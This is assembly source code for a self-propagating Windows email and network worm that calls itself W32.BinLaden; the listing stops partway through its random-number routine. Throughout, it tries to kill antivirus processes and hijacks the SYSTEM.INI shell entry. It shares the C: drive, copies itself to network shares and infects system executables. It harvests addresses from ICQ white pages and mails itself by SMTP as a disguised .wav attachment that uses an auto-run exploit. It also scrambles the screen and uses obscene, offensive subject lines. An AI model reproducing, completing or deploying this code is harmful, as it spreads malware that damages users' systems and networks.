;try to disable some av's and corrupt Default.sfc database
;copy itself to remote windir & share root dir
;infect filez via tmapi
;send email via icq white pages (x-wav bug)
;text to screen, message box, special effects

            P586
            model flat

;;;;;;;;;;;;DBG EQU X      ;  IFDEF, shows activity via OutputDebugString()
            SEH EQU X     ;  IFDEF, apply Structure Exception Handle

            include        bl.inc

            DATASEG

            KeywordArray   label

            include        kw.inc       ;  phrase array

            MyMutex        db 'BinLadenfucksBush',0

            ivct           INVICTUS<?>
            TMAPI          dd ?
            MemAlloc       dd ?
            TheVxName      db 260 dup(?)
            Geral          db 260 dup(?)
            ProcessID      dd ?
            MutexHandle    dd ?
            B64File        dd ?
            LangID         dd ?
            DLLPath        db 260 dup(?)
            saved_esp      dd ?

            CODESEG

Binladen    PROC

dbgad545    label

   IFDEF DBG
            SendDebug ad545, 'STARTING W32.BINLADEN'
   ENDIF

            call functionlst

            include        api.inc

functionlst:pop esi
            mov ecx, function_list_number

get_dll:    push ecx

            lodsd
            push eax             ;  DLL name
            call hide_function
            db 0ffh,15h
            callx LoadLibraryA

            mov ebx, eax         ;  DLL handle
            lodsd
            mov ecx, eax         ;  Number of api to retrieve
            lodsd
            mov ebp, eax         ;  Api Name
            lodsd
            mov edi, eax         ;  Where to store api address

get_api:    push ecx

            push ebp
            push ebx
            call hide_function
            db 0ffh,15h
            callx GetProcAddress
            stosd

            push ebp
            callx lstrlenA
            inc eax
            add ebp, eax

            pop ecx
            loop get_api

            pop ecx
            loop get_dll

            push offset MyMutex
            push FALSE
            push NULL
            call OpenMutexA

            test eax, eax
            jnz EndOfWar

            push offset MyMutex
            push FALSE
            push NULL
            call CreateMutexA

            mov MutexHandle, eax

            callx GetTickCount
            neg eax
            mov rnd_dword, eax

            call rnd_eax
            and eax, 0f0f0f00h
            add eax, 'AAA\'

            push eax
            mov ecx, esp
            inc ecx

            push dword ptr [ecx]
            pop dword ptr [@@rname]
            pop ecx

            push 0
            push eax

            mov ebx, esp

            push 260
            push offset Geral
            callx GetWindowsDirectoryA

            push offset Geral
            callx SetCurrentDirectoryA

            cmp OpenRead, 0
            jz OverSYSINI

            push offset ivct
            push offset sysini
            call OpenRead

            test eax, eax
            jz OverSYSINI

            mov edi, eax
            mov ecx, [ivct._file_size]
            cmp ecx, 1000
            jbe Closesys
            sub ecx, 8
FoundBin:   cmp [edi], 'lleh'  ;  shell=Explorer.exe XXX.exe
            je BinFound
            inc edi
            loop FoundBin
            jmp Closesys

BinFound:   cmp byte ptr [edi+17], 20h
            jne Closesys

            mov ebp, 'FHC' xor 'FUCK'

Closesys:   push offset ivct
            push offset sysini
            call CloseFile

OverSYSINI: push ebx
            push offset Geral
            callx lstrcatA

            pop eax
            pop eax

            push 'EXE.'
            lea eax, @@rname
            add eax, 3

            pop dword ptr [eax]
            push 0
            push dword ptr [eax]

            push esp
            push offset Geral
            callx lstrcatA

            pop eax
            pop eax

            jmp @@iid

@@spname:   call @@KeyName
            db 'shell',0
@@KeyName:    pop ecx

            call @@SectionName
            db 'boot',0
@@SectionName:pop edx

            call systemini
sysini      db 'SYSTEM.INI',0
systemini:
            call explorerstring
            db 'Explorer.exe '
@@rname     db 8 dup (0)
explorerstring:
            push ecx
            push edx
            callx WritePrivateProfileStringA
            ret

@@iid:      callx GetCurrentProcessId
            mov ProcessID, eax

            callx GetUserDefaultLangID
            mov LangID, eax

            push 0
            callx GetModuleHandleA

            push 260
            push offset TheVxName
            push eax
            callx GetModuleFileNameA

            push eax

   IFDEF DBG
pushad
push offset Geral
callx OutputDebugStringA
popad
   ENDIF

            push 260
            push offset DLLPath
            callx GetSystemDirectoryA

            call @@@1
            db '\INVICTUS.DLL',0
@@@1:       push offset DLLPath
            callx lstrcatA

            pop eax

            ;  Is this an automatic execution or not ?

            lea eax, [eax+offset TheVxName-8]
            cmp byte ptr [eax], '\'
            je short Auto

            cmp ebp, 'FHC' xor 'FUCK'
            je short Auto

            push 0
            push offset Geral
            push offset TheVxName
            callx CopyFileA

            dec eax
            jnz Auto

            call @@spname

            jmp short Auto

@@auto:     call ProgError

Auto:       push 260
            push offset Geral
            callx GetWindowsDirectoryA

            push offset Geral
            callx SetCurrentDirectoryA

            push offset ivct
            call @@name_h
            db 'HH.EXE',0
@@name_h:   pop esi
            push esi
            call OpenRead

@@test:     test eax, eax
            jz @@name__
@@test_:    mov edi, eax

            mov eax, [ivct._file_size]
            sub edx, edx
            sub eax, 7
            mov ecx, 101
            div ecx
            test edx, edx
            jz UseIT

            push offset ivct
            push esi
            call CloseFile

            push NULL
            push NULL
            push 1               ;  100% play
            push offset ivct
            push offset TheVxName
            push 'EXE.'
            push esi
            call InfectFile

            dec eax
            jnz Auto

            push offset ivct
            push esi
            call OpenRead
            jmp @@test

@@name__:   push offset ivct
            call @@name_
            db 'NETSTAT.EXE',0
@@name_:    pop esi
            push esi
            call OpenRead

            test eax, eax
            jnz @@test_

@@name___:  push offset ivct
            call @@name____
            db 'CALC.EXE',0
@@name____: pop esi
            push esi
            call OpenRead
            jmp @@test

UseIT:      mov eax, [ivct._file_size]
            lea eax, [eax*2]
            push eax
            push 40h
            callx GlobalAlloc

            mov [B64File], eax
            test eax, eax
            jz GetAVMem
;00401372
            push [ivct._file_size]
            push edi
            push eax
            call procB64encode

            push offset ivct
            push esi
            call CloseFile

GetAVMem:   mov ebx, 8

            call AVArray
            db 'Antiviral Toolkit Pro',0
            db 'AVP Monitor',0
            db 'Norton AntiVirus',0
            db 'Zone Alarm',0
            db 'Freedom',0
            db 'Avconsol',0
            db 'McAfee VirusScan',0
            db 'Vshwin32',0

AVArray:    pop esi

AVArray1:   test ebx, ebx
            jz short EndAVDel

            push esi
            push 0
            callx FindWindowA
            push eax

            push esi
            callx lstrlenA

            inc eax
            add esi, eax
            pop eax

            dec ebx

            test eax, eax
            jz AVArray1

            ;  Run Anti-AntiVirus if found one active in memory

            call DeleteAntiV

            jmp AVArray1

EndAVDel:   ;  Try to infect shared windows directories &
            ;  Share DRIVE C:\

            call ModuloNet

            call InfectDrive

            call ThePayload

            call XpltXplorer

            call GetPass

            cmp GetTcpTable, 0
            jz short TryWininet

            sub esp, 1000
            mov edi, esp
            mov esi, edi

            cld
            mov ecx, 1000
            rep stosb

            push 1
            call TcpBuffSize
            dd 1000
TcpBuffSize:push esi
            call GetTcpTable

            mov ecx, 1000
ScanTcpTbl: lodsb
            test al, al
            jnz short TcpEntryOK
            loop ScanTcpTbl

TcpEntryOK: sub esp, -1000
            test al, al
            jnz short InetActive

            jmp NoInternet

TryWininet: cmp InternetGetConnectedState, 0
            jz NoInternet

            push eax
            mov eax, esp

            push 0
            push eax
            call InternetGetConnectedState

            add esp, 4

            dec eax
            jnz NoInternet

InetActive: ;  0040142a

            call ICQSendMail

NoInternet: push MutexHandle
            callx CloseHandle

            push 300 * 1000
            callx Sleep

            jmp GetAVMem

EndOfWar:

   IFDEF DBG
            SendDebug ad546, 'OUT W32.BINLADEN'
   ENDIF
            push -1
            callx ExitProcess

ModuloNet:  

   DATASEG
            netpath     db 512 dup(?)
            netpath2    db 512 dup(?)
            windirpath  db 260 dup(?)
            sharehandle dd ?
   CODESEG

   IFDEF DBG
            SendDebug   ad323, 'STARTING MODULO NET'
   ENDIF

   IFDEF SEH
            push offset ErroNet
            push dword ptr fs:[0]
            mov fs:[0], esp
   ENDIF

            push 16 * 1024
            push 40h
            callx GlobalAlloc

            test eax, eax
            jz NetRet

            mov [MemAlloc], eax

            ;  Share C:\

   IFDEF DBG
            SendDebug   ad216, 'STARTING SHARE C:\ (M_NET)'
   ENDIF

            push offset sharehandle
            call lanman
            db 'Software\Microsoft\Windows\CurrentVersion\Network\LanMan\BinLaden',0
lanman:     push HKEY_LOCAL_MACHINE
            callx RegCreateKeyA

            cmp eax, ERROR_SUCCESS
            jne abortshare

            call setvalue

            dd 4
            dd 402
            dd REG_DWORD
            db 'Flags',0

            dd 0
            dd 0
            dd REG_BINARY
            db 'Parm1enc',0

            dd 0
            dd 0
            dd REG_BINARY
            db 'Parm2enc',0

            dd 4
            db 'C:\',0
            dd REG_SZ
            db 'Path',0

            dd 0
            dd 0
            dd REG_SZ
            db 'Remark',0

            dd 4
            dd 0
            dd REG_DWORD
            db 'Type',0

setvalue:   pop esi
            mov ebx, 6

valueloop:  lodsd
            push eax          ;  SZ
            push esi          ;  Address of value data
            lodsd
            lodsd
            push eax          ;  dwType
            push NULL         ;  Reserved
            push esi          ;  Address of value to set

            push esi
            callx lstrlenA
            inc eax
            add esi, eax

            push sharehandle
            callx RegSetValueExA

            cmp eax, ERROR_SUCCESS
            jne short closeshare

            dec ebx
            jnz short valueloop

closeshare: push sharehandle
            callx RegCloseKey

abortshare: 

   IFDEF DBG
            SendDebug   ad865, 'STARTING NETWORK EXPLORER (M_NET)'
   ENDIF

            push [MemAlloc]
            push NULL
            call NetWorkExplorer

            mov esi, [MemAlloc]
            mov edi, esi
DoNetLoop:  cld
            lodsb
            cmp al, 0
            je EndModulo
            cmp al, 0dh
            jne short DoNetLoop
            mov byte ptr [esi-1], 0
            push edi
            call NetHunter
            lea edi, [esi+1]
            jmp DoNetLoop

EndModulo:  push [MemAlloc]
            callx GlobalFree

            sub eax, eax
            mov [MemAlloc], eax

NetRet:

   IFDEF SEH
            pop dword ptr fs:[0]
            pop eax
   ENDIF
   IFDEF DBG
            SendDebug   ad1, 'OUT MODULO NET'
   ENDIF

            ret

ErroNet:    mov esp, [esp+8]
            jmp NetRet

NetHunter:  pushad
            push dword ptr [esp+(4*8)+4]
            push offset netpath
            callx lstrcpyA

            call WinDrive
            db '\WIN',0,'\WIN2000',0,'\WIN2K',0,'\WINNT',0,'\WINDOWS',0,'\WINXP',0
WinDrive:   pop edi
            mov ecx, 6

HunterLoop: push ecx

            push offset netpath
            push offset netpath2
            callx lstrcpyA

            push edi
            push offset netpath2
            callx lstrcatA

            push offset netpath2
            call NetEXE

            push edi
            callx lstrlenA

            inc eax
            add edi, eax

            push offset netpath2
            callx lstrlenA

            push edi
            mov edi, offset netpath2

            sub ecx, ecx
            dec ecx
            add edi, eax
            std
            mov al, '\'
            repne scasb
            mov byte ptr [edi+1], 0

            pop edi
            pop ecx

            loop HunterLoop
            popad
            ret (4*1)

NetEXE      PROC
            ARG   NetName:DWORD = arg_netexe_len

DATASEG
            ForeignName db 260 dup(?)
            SystemName db 260 dup(?)
            RandomName db 10 dup(?)
CODESEG
            pushad
            lea ebx, ForeignName

            push NetName
            push ebx
            callx lstrcpyA

            callx GetTickCount
            lea eax, [eax*8]
            and eax, 0f0f0f00h
            add eax, 'AAA\'

            lea ecx, RandomName

            mov [ecx], eax
            mov [ecx+4], 'EXE.'
            xor al, al
            mov [ecx+8], al

            push ecx
            push ebx
            callx lstrcatA

            push 0
            push ebx
            push offset TheVxName
            callx CopyFileA

            dec eax
            jnz CopyFailed

            sub esp, 260
            mov ebx, esp

            push NetName
            push ebx
            callx lstrcpyA

            call OverIVCT
            db '\INVICTUS.DLL',0
OverIVCT:   push ebx
            callx lstrcatA

            push 0
            push ebx
            push offset DLLPath
            callx CopyFileA

            sub esp, - 260

            dec eax
            jnz CopyFailed

            lea ebx, SystemName

            push NetName
            push ebx
            callx lstrcpyA

            lea eax, RandomName
            inc eax              ;  '\'

            push eax
            push offset AddRND
            callx lstrcpyA

            call SystemSTR
            db '\SYSTEM.INI',0
SystemSTR:  push ebx
            callx lstrcatA

            call explorerSTR
            db 'Explorer.exe '
AddRND      db 10 dup(0)
explorerSTR:pop eax

            call KeyName
            db 'shell',0
KeyName:    pop ecx

            call SectionName
            db 'boot',0
SectionName:pop edx

            push ebx
            push eax
            push ecx
            push edx
            callx WritePrivateProfileStringA

            IFDEF DBG
   pushad
   lea eax, ForeignName
   push eax
   callx OutputDebugStringA
   popad
            ENDIF

CopyFailed: popad
            ret

NetEXE      ENDP

InfectDrive PROC

   DATASEG
            TmIndex dd ?
            TmElement db 260 dup(?)
   CODESEG

   IFDEF DBG
            SendDebug ad3, 'STARTING MODULO TMAPI'
   ENDIF

   IFDEF SEH
            push offset ErrorTmapi
            push dword ptr fs:[0]
            mov fs:[0], esp
   ENDIF

            call InitTmTable
            mov TmIndex, 0

NextIndex:  push offset TmElement
            push TmIndex
            call GetTmElementByIndex

            dec eax
            jnz EndIndex

            inc TmIndex

            push 0
            push 0
            push 2
            push offset ivct
            push offset TheVxName
            push 'EXE.'
            push offset TmElement
            call InfectFile

            jmp NextIndex

ErrorTmapi:

   IFDEF SEH
            mov esp, [esp+8]
   ENDIF

EndIndex:

   IFDEF SEH
            pop dword ptr fs:[0]
            pop eax
   ENDIF

FreeTMAPI:  call CloseTmTable

   IFDEF DBG
            SendDebug ad2, 'OUT MODULO TMAPI'
   ENDIF

            ret
InfectDrive ENDP

ICQSendMail PROC

DATASEG
            ICQInetOpenHandle dd ?
            ICQInetUrlHandle dd ?
            BytesToDownload dd ?
            BytesInternetRead dd ?
            PointerEmailBuff1 dd ?
            PointerEmailBuff2 dd ?
            EmailToSmtpIndex dd ?
            EMAILSocket dd ?
            Folder db 260 dup (?)
            rcpt db 1024 dup(?)
            From db 260 dup(?)
            recvBuff db 532 dup (?)
CODESEG

   DATASEG
            BufferInternetRead   db 17 * 1024 dup(?)
            EmailEntryList       db 02 * 1024 dup(?)
            ServerSMTP           db 60 dup(?)
            lpWSADATA            WSADATA<?>
   CODESEG

   IFDEF DBG
            SendDebug ad549, 'STARTING MODULO ICQSENDMAIL'
   ENDIF

   IFDEF SEH
            pushad
            call ErrorIcq
            mov esp, [esp+8]
            jmp EndIcqSMail
ErrorIcq:   push dword ptr fs:[0]
            mov fs:[0], esp
   ENDIF

            sub eax, eax
            mov EMAILSocket, eax
;jmp cp_test_ini

ICQNow:     callx GetTickCount
            mov esi, offset KeywordArray
            and eax, 15
            mov esi, [esi+(eax*4)]

            IFDEF DBG
   pushad
   push esi
   callx OutputDebugStringA
   popad
            ENDIF

            push esi
            push offset KeyWord
            callx lstrcpyA

            mov edi, offset EmailEntryList
            push edi
            mov ecx, ((02 * 1024) - 20)
            cld
            xor al, al
            rep stosb
            pop edi

            sub eax, eax
            push eax
            push eax
            push eax
            push INTERNET_OPEN_TYPE_DIRECT
            call STRbinladen
            db 'W32.BinLaden',0
STRbinladen:
            call InternetOpenA

            test eax, eax
            jz EndIcqSMail

            mov ICQInetOpenHandle, eax

            sub eax, eax
            push eax
            push eax
            push eax
            push eax
            call STRWhitPage
            db 'http://wwp.icq.com/scripts/white.dll?int=0&keyword='
KeyWord     db 40 dup(0)

STRWhitPage:push [ICQInetOpenHandle]
            call InternetOpenUrlA

            test eax, eax
            jz EndIcqSMail

            mov ICQInetUrlHandle, eax

MailLoop:   sub eax, eax
            push eax
            push eax
            lea eax, BytesToDownload
            push eax
            push [ICQInetUrlHandle]
            call InternetQueryDataAvailable

            test eax, eax
            jz ClsUrlHndle

            mov eax, [BytesToDownload]
            test eax, eax                 ;  end?
            jz ClsUrlHndle
            cmp eax, -1                   ;  error?
            je ClsUrlHndle
            cmp eax, 16 * 1024
            jae GetNetBlock
            jmp GetNetAvail

GetNetBlock:mov eax, 16 * 1024
GetNetAvail:lea ecx, BytesInternetRead
            push ecx
            push eax
            push offset BufferInternetRead
            push [ICQInetUrlHandle]
            call InternetReadFile

            test eax, eax
            jz ClsUrlHndle

            mov eax, [BytesInternetRead]

            test eax, eax
            jz ClsUrlHndle
            cmp eax, -1
            je ClsUrlHndle

            sub [BytesToDownload], eax

            ; process email to <EmailEntryList>

            mov edi, offset EmailEntryList
            mov esi, offset BufferInternetRead
            mov ebx, eax

ScanIT:     cld
            lodsb
            dec ebx
            jz MailLoop
            or [esi], 20202020h
            cmp [esi], 'iam"'
            jne short ScanIT
            lodsd

;<a href="mailto:"> --> exemplo de usuario sem email
;<a href="mailto:suce7@libertysurf.fr"> --> com email

            or [esi], 20202020h
            cmp [esi], ':otl'
            jne short ScanIT
            lodsd
            cmp byte ptr [esi], '"'
            je ScanIT
            mov PointerEmailBuff1, edi
            mov PointerEmailBuff2, esi
            mov ecx, 40
copyemail:  cld
            lodsb
            cmp al, '"'
            je copydone

            cmp al, 'A'
            jb nolow
            cmp al, 'Z'
            jbe chlow

            cmp al, 'a'
            jb nolow
            cmp al, 'z'
            ja nolow

chlow:      or al, 20h
nolow:      stosb
            loop copyemail
            ; error, restore email buffer
savedpoint: mov edi, PointerEmailBuff1
            mov esi, PointerEmailBuff2
            jmp ScanIT

copydone:   mov ecx, edi
            sub ecx, PointerEmailBuff1 ;  string size            
            mov al, 0   ;  0ffh
            stosb
IFDEF DBG
   pushad
   push offset EmailEntryList
   callx OutputDebugStringA
   popad
ENDIF
            call .smtp0
            jmp ScanIT

ClsUrlHndle:push [ICQInetUrlHandle]
            call InternetCloseHandle

ClsOpenHndl:push [ICQInetOpenHandle]
            call InternetCloseHandle

x_closeskt: callx WSACleanup

            jmp ICQNow

;           let's try to get some SMTP servers

.smtp0:     pushad
            mov saved_esp, esp
            cld
            mov esi, offset EmailEntryList
            mov edi, offset ServerSMTP
x_smtp1:    lodsb
            stosb
            cmp al, 0   ;  0ffh
            je smtpcopied
            jmp short x_smtp1

smtpcopied: mov edi, offset ServerSMTP
            push -1
            pop ecx
            mov al, '@'
            repne scasb
     ;EDI = @+1
            jmp smtpseeker

            smtp1                db 'smtp.'
            ServerSMTP01         db 30 dup(?)
            smtp2                db 'mail.'
            ServerSMTP02         db 30 dup(?)

smtpseeker: push edi
            push offset ServerSMTP01
            callx lstrcpyA

            push edi
            push offset ServerSMTP02
            callx lstrcpyA

            sub eax, eax

            cmp EMAILSocket, eax
            jnz short startOK

            lea eax, lpWSADATA
            push eax
            push 101h
            callx WSAStartup

            test eax, eax
            jnz @@ret

startOK:    push eax
            inc eax
            push eax
            inc eax
            push eax
            callx socket

            cmp eax, INVALID_SOCKET
            je @@ret

            mov EMAILSocket, eax

socketOK:   push edi
            callx gethostbyname

            ;  invalid host ?

            test eax, eax
            jz @@ret

            mov edi, eax

            push offset smtp1
            callx gethostbyname

            test eax, eax
            jnz short SmtpFound

            push offset smtp2
            callx gethostbyname

            test eax, eax
            jnz short SmtpFound

            ;  try connection with default host

NewServer:  mov eax, edi

SmtpFound:  mov eax, [eax+4]
            mov eax, [eax+4]
            mov SmtpHost, eax

            push 16
            call sockaddr
            dd 019000002h
SmtpHost    dd 0
            dd 0

sockaddr:   push EMAILSocket
            callx connect

            test eax, eax
            jz HandShake

            mov eax, [edi+4]
            mov eax, [eax+4]

            cmp SmtpHost, eax
            jne short NewServer

            jmp @@ret

            ;  hand-shake starts here

HandShake:  call rnd_eax
            and eax, 0f0f0f0fh
            add eax, 'AAAA'
            mov [rnd_server], eax
            neg eax
            and eax, 0f0f0f0fh
            add eax, 'AAAA'
            mov [rnd_server+4], eax

            call recv_x

            mov eax, helo_sz
            mov ecx, offset heloserver
            call send_x

            call recv_x

            jmp heloserver_after

heloserver  db 'HELO ????????'
rnd_server equ dword ptr $-8
            db 13,10
helo_sz     equ (offset $ - offset heloserver)

heloserver_after:

            ;  sending rnd hotmail user (debug version)

;            call rnd_eax
;            and eax, 0f0f0f0fh
;            add eax, 'aaaa'
;            mov dword ptr [rnd_usr], eax
;            neg eax
;            and eax, 0f0f0f0fh
;            add eax, 'aaaa'
;            mov dword ptr [offset rnd_usr+4], eax

            mov eax, rnd_usr_len
            mov ecx, offset _rnd_usr
            call send_x

            call recv_x

            jmp _rnd_usr_after

_rnd_usr    db 'MAIL FROM: <' 
rnd_usr     db 'root@fun.com>',13,10
rnd_usr_len equ (offset $ - offset _rnd_usr)

_rnd_usr_after:

            ;  sending recipient

            call rcpt_
            db 'RCPT TO: <',0
rcpt_:      lea eax, rcpt
            push eax
            callx lstrcpyA

            push offset ServerSMTP
            lea eax, rcpt
            push eax
            callx lstrcatA

            call rcpt_2
            db '>',13,10,0
rcpt_2:     lea eax, rcpt
            push eax
            callx lstrcatA

            lea eax, rcpt
            push eax
            callx lstrlenA

            ;  EAX=sIzE
            lea ecx, rcpt
            call send_x

            call recv_x

            mov eax, 6
            mov ecx, offset __data
            call send_x

            call recv_x

            jmp __data_after

__data      db 'DATA',13,10

__data_after:

            mov eax, LangID
            cmp al, LANG_PORTUGUESE
            je FrasePort
            cmp al, LANG_SWEDISH
            je FraseSwedis
            cmp al, LANG_FRENCH
            je FraseFrench
            cmp al, LANG_GREEK
            je FraseGreek

            call choose_sbjt

            dd offset eng_subject1
            dd offset eng_subject2
            dd offset eng_subject3
            dd offset eng_subject4
            dd offset eng_subject5
            dd offset eng_subject6
            dd offset eng_subject7
            dd offset eng_subject8

FraseFrench:call choose_sbjt
            dd offset fre_subject1
            dd offset fre_subject2
            dd offset fre_subject3
            dd offset fre_subject4
            dd offset fre_subject5
            dd offset fre_subject6
            dd offset fre_subject7
            dd offset fre_subject8

FraseSwedis:call choose_sbjt
            dd offset swe_subject1
            dd offset swe_subject2
            dd offset swe_subject3
            dd offset swe_subject4
            dd offset swe_subject5
            dd offset swe_subject6
            dd offset swe_subject7
            dd offset swe_subject8

FrasePort:  call choose_sbjt
            dd offset por_subject1
            dd offset por_subject2
            dd offset por_subject3
            dd offset por_subject4
            dd offset por_subject5
            dd offset por_subject6
            dd offset por_subject7
            dd offset por_subject8

FraseGreek: call choose_sbjt
            dd offset gre_subject1
            dd offset gre_subject2
            dd offset gre_subject3
            dd offset gre_subject4
            dd offset gre_subject5
            dd offset gre_subject6
            dd offset gre_subject7
            dd offset gre_subject8

eng_subject1   db 'Bin Laden toillete paper !!     ',0
eng_subject2   db 'Sadam hussein & BinLaden IN LOVE',0
eng_subject3   db 'Bush fucks Bin Laden hardly <:P ',0
eng_subject4   db 'Is Osama Bin Laden BAD-LOVED ?  ',0
eng_subject5   db 'USA against Geneva Convention ? ',0
eng_subject6   db 'Anthrax mail is true(not a joke)',0
eng_subject7   db 'Biological weapons: Preventing !',0
eng_subject8   db 'Fucking a mullah in Islamabad   ',0

por_subject1   db 'O papel higienico do Bin Laden !',0
por_subject2   db 'Sadam e BinLaden apaixonados    ',0
por_subject3   db 'Bush fudendo Bin Laden  <:P     ',0
por_subject4   db 'Será que o Osama é mal-amado ?  ',0
por_subject5   db 'EUA agride convençao de genova ?',0
por_subject6   db 'Antraz pelo correio (verdade)   ',0
por_subject7   db 'Armas biologicas: Previna-se !  ',0
por_subject8   db 'Fudendo um mulá em Islamabad  ',0

swe_subject1   db 'Bin Landen Toalettpapper        ',0
swe_subject2   db 'Sadam hussein & BinLaden är förälskade',0
swe_subject3   db 'Bush knullar Bin Laden hårt <:P ',0
swe_subject4   db 'är Osama Bin Laden inte älskad ?',0
swe_subject5   db 'Är USA emot Geneve överenskommelsen ? ',0
swe_subject6   db 'Anthrax brevet existerar(det är inget skämt)',0
swe_subject7   db 'Biologiska vapen: Förhindra !   ',0
swe_subject8   db 'Knulla en muslim i Islamabad    ',0

fre_subject1   db 'papier toillette Bin Laden      ',0
fre_subject2   db 'Sadam & BinLaden EN AMOUR       ',0
fre_subject3   db 'Bush nique à donf Bin Laden <:P ',0
fre_subject4   db 'Osama Bin Laden Mal Aimé ?      ',0
fre_subject5   db 'Usa contre la convention de Geneve?',0
fre_subject6   db 'Le courrier Anthrax existe vraiment',0
fre_subject7   db 'Arme Biologique: Préventions!   ',0
fre_subject8   db 'Baiser un mullah à Islamabad    ',0

gre_subject1   db 'Xarti toualetas Bin Landen !!  ',0
gre_subject2   db 'Hussein & Bin Laden, ERASTES   ',0
gre_subject3   db 'O Bush gamaei agria ton Bin Laden',0
gre_subject4   db 'Einai o Osama apotuximenos ston erwta?',0
gre_subject5   db 'Amerikh enantia sto synedrio tis Genova?',0
gre_subject6   db 'H epistoles me Antraka,einai gegonos',0
gre_subject7   db 'Biologika wpla: Prostasia !    ',0
gre_subject8   db 'Gamontas ena Moula sto Islamabad',0

choose_sbjt:call rnd_eax
            and eax, 7
            pop ecx
            push esi

            mov esi, [ecx+(eax*4)]
            mov edi, offset subject
            cld
copy_subjct:lodsb
            test al, al
            jz copy_ok
            stosb
            jmp short copy_subjct
copy_ok:    pop esi

            call _boundary

boundarywww db 'Subject: '
subject     db 46 dup (20h)
            db 13,10
            db 'MIME-Version: 1.0'
            db 13,10
            db 'Content-Type: multipart/mixed;',13,10,09h
boundary0   db 'boundary="----=_NextPart_000_0009_01C154DE.24E75DA0'
boundary0sz equ (offset $ - offset boundary0)
            db 13,10
            db 'X-Priority: 3'
            db 13,10
            db 'X-MSMail-Priority: Normal'
            db 13,10
            db 'X-Mailer: Microsoft Outlook Express 5.00.2615.200'
            db 13,10
            db 'X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2615.200'
            db 13,10,13,10
            db 'This is a multi-part message in MIME format.'
            db 13,10,13,10
boundary1   db '------=_NextPart_000_0009_01C154DE.24E75DA0'
boundary1sz equ (offset $ - offset boundary1)
            db 13,10
            db 'Content-Type: text/html;'
            db 13,10,09h
            db 'charset="iso-8859-1"'
            db 13,10
            db 'Content-Transfer-Encoding: quoted-printable'
            db 13,10,13,10
            db '<HTML>',13,10,'<HEAD>',13,10,'</HEAD>'
            db 13,10
            db '<BODY bgColor=3D#ffffff>' ;  <BGSOUND ='
            db 13,10
            db '<iframe src=3D"cid:000801c154f7$4a1303e0$0100007f@khs3j5"></iframe>'
            db 13,10
            db '<DIV><FONT face=3DArial size=3D2> </FONT></DIV></BODY></HTML>'
            db 13,10,13,10
            db '------=_NextPart_000_0009_01C154DE.24E75DA0'
            db 13,10
            db 'Content-Type: audio/x-wav;'
            db 13,10,09h
            db 'name="BINLADEN_BRASIL.EXE"'
            db 13,10
            db 'Content-Transfer-Encoding: base64'
            db 13,10
            db 'Content-ID: <000801c154f7$4a1303e0$0100007f@khs3j5>'
            db 13,10,13,10

_boundary:  pop ecx
            mov eax, (offset _boundary - offset boundarywww)
            call send_x

            ; sending file

            push [B64File]
            callx lstrlenA

            mov ecx, [B64File]
            call send_x

            call _boundary2

boundary2   db '------=_NextPart_000_0009_01C154DE.24E75DA0--'
boundary2sz equ (offset $ - offset boundary2)

_boundary2: pop ecx
            mov eax, boundary2sz
            call send_x

            ;  closing connection

            mov eax, 5
            mov ecx, offset __quit
            call send_x

            call recv_x

            mov eax, 6
            mov ecx, offset ___quit
            call send_x

            call recv_x

@@ret:      push EMAILSocket
            callx closesocket
            sub eax, eax
            mov EMAILSocket, eax
            mov esp, saved_esp
            popad
            ret

__quit     db 13,10,'.',13,10
___quit    db 'QUIT',13,10

send_x:     pushad
            mov esi, ecx
            mov edi, eax

send_x_test: ;cmp edi, 127
            ;jb send_x_1

            call send_x_512

            cmp eax, SOCKET_ERROR
            jne short send_x_math

            push 500
            callx Sleep

            call send_x_512

            cmp eax, SOCKET_ERROR
            je send_x_erro

send_x_math:sub edi, eax
            add esi, eax
            test edi,edi
            jz send_x_end
            jmp send_x_test

send_x_1:   call thesend

            cmp eax, SOCKET_ERROR
            jne short send_x_math

            push 500
            callx Sleep

            call thesend

            cmp eax, SOCKET_ERROR
            jne short send_x_math

            jmp send_x_erro

thesend:
            push 0
            push edi ;  size
            push esi ;  ofs
            push [EMAILSocket]
            callx send
            ret

recv_x:     pushad
            lea eax, recvBuff
            push 0
            push 127
            push eax
            push [EMAILSocket]
            callx recv

            IFDEF DBG
   pushad
   lea eax, recvBuff
   push eax
   callx OutputDebugStringA
   popad
            ENDIF

send_x_end: popad
            pop ecx
            jmp ecx

send_x_erro:sub eax, eax
            dec eax
            mov [esp+(4*7)], eax
            jmp send_x_end

send_x_512: push 0

            cmp edi, 1024
            ja push_1024

            cmp edi, 512
            ja push_512

            cmp edi, 127
            ja push_127

            push edi
            jmp over_127

push_1024:  push 1024
            jmp over_127

push_512:   push 512
            jmp over_127

push_127:   push 127
over_127:   push esi ;  ofs
            push [EMAILSocket]
            callx send
            ret

EndIcqSMail:

   IFDEF SEH
            pop dword ptr fs:[0]
            pop eax
            popad
   ENDIF

            sub eax, eax
            mov EMAILSocket, eax
            callx WSACleanup

   IFDEF DBG
            SendDebug ad943, 'OUT ICQSENDMAIL'
   ENDIF

            ret

ICQSendMail ENDP

ThePayload  PROC

   IFDEF DBG
            SendDebug ad328, 'STARTING MODULO PAYLOAD'
   ENDIF

            callx GetTickCount
            and eax, 1111111111b

            sub eax, 864
            jnz PayRet

ShowMsg:    push 0
            callx GetDC

            mov edi, eax
            mov ecx, 500

TxtToScreen:push ecx

            call rnd_eax
            and eax, 3

            push eax
            push edi
            callx SetBkMode

            call rnd_eax

            push eax
            push edi
            callx SetBkColor

            call rnd_eax

            push eax
            push edi
            callx SetTextColor

            call rnd_eax
            and eax, 11111111111b
            mov edx, eax

            call rnd_eax
            and eax, 11111111111b

            push StringSize
            push offset MainString
            push eax
            push edx
            push edi
            callx TextOutA

            pop ecx
            loop TxtToScreen

            push 0
            push offset BushText1
            push offset BushText2
            push 0
            callx MessageBoxA

            push 10 * 1000
            callx Sleep

screen_mix: call rnd_eax
            and eax, 111111111b
            mov ecx, eax
            call rnd_eax
            and eax, 111111111b
            mov edx, eax

            call rnd_eax
            and eax, 1
            jz dtsinv

            push NOTSRCCOPY
            jmp Fix

dtsinv:     push DSTINVERT
Fix:        push ecx
            push edx
            push edi

            call rnd_eax
            and eax, 111111111b
            mov ecx, eax
            call rnd_eax
            and eax, 111111111b
            mov edx, eax

            push ecx
            push edx

            call rnd_eax
            and eax, 111111111b
            mov ecx, eax
            call rnd_eax
            and eax, 111111111b
            mov edx, eax

            push ecx
            push edx
            push edi
            callx BitBlt

            push 250
            callx Sleep

            jmp screen_mix
PayRet:
   IFDEF DBG
            SendDebug ad325, 'OUT MODULO PAYLOAD'
   ENDIF
            ret

rnd_eax:    push ecx
            push edx
            mov eax, 12345678h
